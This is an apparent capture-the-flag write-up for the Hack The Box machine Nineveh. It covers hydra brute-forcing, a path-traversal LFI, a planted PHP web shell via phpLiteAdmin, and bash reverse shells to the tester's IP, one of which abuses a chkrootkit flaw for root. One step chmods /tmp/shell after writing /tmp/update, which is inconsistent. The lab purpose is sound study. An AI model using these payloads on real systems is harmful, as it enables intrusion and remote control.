# Nineveh [HTB](https://app.hackthebox.com/machines/54)
![nineveh-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/nineveh-01.png)

## Recon

After adding the target to `/etc/hosts`, i run an `nmap` scan with:

```bash
nmap -sC -sV -A -p- nineveh.htb -oN nmap.result
```

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/nmap-res-02.png)

We have a single Apache server running on ports 80 and 443, lets check them out. 

### Apache Port 80

If we open the site at `http://noneveh.htb/` we see the following:

![site-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/site-03.png)


Not much to see here, lets run a directory and file scan with:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://nineveh.htb/FUZZ -e .cgi,.php,.txt,.bak,.sql,.pl,.sh,.py
```

![ffuf-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/ffuf-04.png)

We have two interestig results. The first is a php info page, it is possible to exploit this if `file_uploads = on`, and we have LFI. More info [here](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf), however the second folder is a login page:

![dept-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/dept-05.png)

The good old `admin:admin` combo gives away some username information disclosure, this makes brute forcing easier so lets try it! 
To do that i setup `hydra` as such:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password\!"
```

![hydra-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/hydra-06.png)

Now we can login:

![login-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/login-07.png)

Not much to see here, lets check this `Notes` link:

![notes-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/notes-08.png)

This note references a login page, definitely not this one since it mentions only having a password field. It's probably reffering to the site running on
port 443. But before we check it out, I've noticed something interesting in the URL:

![lfi-08.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/lfi-08.5.png)

Looks like the URL is fetching a file, I'm thinking LFI, let's poke around. At first i sent the following payload `files/ninevehNotes.txt/../../../../../etc/passwd`

![erro-08.6](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/err-08.6.png)

This does raise an error. Then i tried `files/../../../../etc/passwd` which didnt raise an error. 
Maybe we need `ninevehNotes` to be in the path? perhaps if we remove the `.txt` extension instead:

`file/ninevehNotes/../../../../../../../etc/passwd`

![passwd-08.7](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/passwd-08.7.png)

There it is. However at this point we can't really do much with it. We can try to guess filenames on the system through this LFI, but it will take a very long time, and possibly wont lead us to getting a shell. Lets leave it for now and check the site on port 443.


### Apache Port 443

If we open the site at `https://nineveh.htb`, we see the following:

![site-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/site-09.png)

Lets run a directory and file scan with:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ -e .cgi,.php,.txt,.bak,.sql,.sh,.py,.pl
```
![ffuf-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/ffuf-10.png)

If we open this directory we are greeted to the mentioned login form:

![db-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/db-11.png)

If we search `phpLiteAdmin v1.9` online we can find an exploit from [ExploitDB](https://www.exploit-db.com/exploits/24044), but in order to pull this off we need to be authinticated. 

Lets try to brute force this page as well, i use `hydra` once again:

```bash
hydra -l admin -P  /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"
```

![hydra-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/hydra-12.png)

Lets login:

![php-admin-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/php-admin-13.png)

Now we can try to pull of the RCE attack by creating a new database with a `.php` extension. Then, we need to create a table, and add a text field 
with `php` code for RCE inside the table. Then we can use the LFI vulnerability to render our database, which will trigger the RCE. 

First, we need to create a new database with a `.php` extension:

![create-db-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/create-db-14.png)

Now, we need to switch over to this database by clicking on it:

![switch-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/switch-15.png)

When we see the name of our database at the top we know that we are working on the right database. 
The next step would be to create a new table with one field, this field will hold the `php` command injection code. 

![table1-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/table1-16.png)

Now we create a field with the `php` command injection:

```php
<?php system($_GET["cmd"]); ?>
```

![field-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/field-17.png)


Finally, we insert the field into the table:

![insert-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/insert-18.png)

![result-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/result-19.png)


Now we need to determine the path to the database so we can execute it via the LFI vulnerabiulity. 
If we go to the `Rename` tab, we can find the path to the database:

![path-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/path-20.png)

There it is, we should have everything at this point, lets go back to the LFI and try to execute our php code:

`http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/htb.php&cmd=whoami`

![rce-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/rce-21.png)

After a few attempts, i found a working payload for a reverse shell.

```bash
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.61/443+0>%261'
```

Do note that we need to URL encode the `&` characters otherwise they will be interpreted as new paramaters. With this in mind we get a shell:

![shell-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/shell-22.png)


## Privilege Escalation


After i land on the system i upgrade to a tty shell with:

```bash
python3 -c 'import pty;pty.spawn("bash")'
```

After that i started to have a look around the system when i found an interesting email in `/var/mail`:

![email-priv-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/emial-priv-23.png)

Looks like anyone can read the file:

![email-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/email-24.png)


Sounds like a reference to port knocking, could these numbers be a port combination? 
Lets see if we have a a `knockd` service running:

```bash
ps auxww | grep knock
```

![knock-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/knock-25.png)


Lets check the `/etc/knockd.conf` file to see exactly what goes on:

![conf-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/conf-31.png)

Thoes are the numbers from the email. If we send a TCP syn packet to each of these three ports in a sequence in less then 5 seconds, the `knockd` process will set a firewall rule allowing SSH connection from our machine using `iptables`. But in order to connect with `ssh` we need credentials or a key, lets keep looking around. 

After a bit of searching i found an undiscovered directory in the `ssl` site:

![ssl-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/ssl-26.png)

I dont recall seeing this in any of the brute forcing attempts i ran. If we run `strings nineveh.png` image we see something interesting:

![rsa-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/rsa-27.png)

Looks like there is hidden content inside the image. I went to this directory in my browser and downloaded the file to my Kali machine to examine further. 

![hidden-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/hidden-28.png)

If we run `binwalk` on the image we can see there is a zip archive hidden inside:

![binwalk-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/binwalk-29.png)

We can extract it with `binwalk --run-as=root -e nineveh.png`

![extract-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/extract-30.png)

So we have the public key needed for the port knocking, lets try it out. We can use `nmap` to do the [knocking](https://wiki.archlinux.org/index.php/Port_knocking). 

Here is the `nmap` knocking one liner:

```bash
for i in 571 290 911; do
> nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.112.243 > /dev/null
> done; ssh -i ~/boxes/HackTheBox/Nineveh/_nineveh.png.extracted/secret/nineveh.pub amrois@10.129.112.243
```
![ssh-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/ssh-32.png)

After a bit of looking around i found an unusual directory `/report`:

![report-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/report-33.png)

If we open one of these files we can see:

![file-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/file-34.png)

This looks like output from the [chrootkit](http://www.chkrootkit.org/) program, its probably running in a background task. Lets check for exploits:

```bash
searchsploit chkrootkit
```

![exploits-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/exploit-35.png)

Lets read this `.txt` file:

![slapper-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/slapper-36.png)

This loop of code will execute any file in `$SLAPPER_FILES` because of missing quotation marks around 
the variable assignment. `$SLAPPER_FILES` is set a few lines earlier:

![set-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/set-37.png)

So if we write a reverse shell and place it in `/tmp/update`, it should then get executed by the user 
running `chkrootkit` which is usually root. 

To create the reverse shell file i use:
	
```bash
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.61/9009 0>&1' > /tmp/update
chmod +x /tmp/shell
```

I start my listener:

```bash
rlwrap nc -lnvp 9009
```

And a get a connection:

![root-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Nineveh/img/root-38.png)
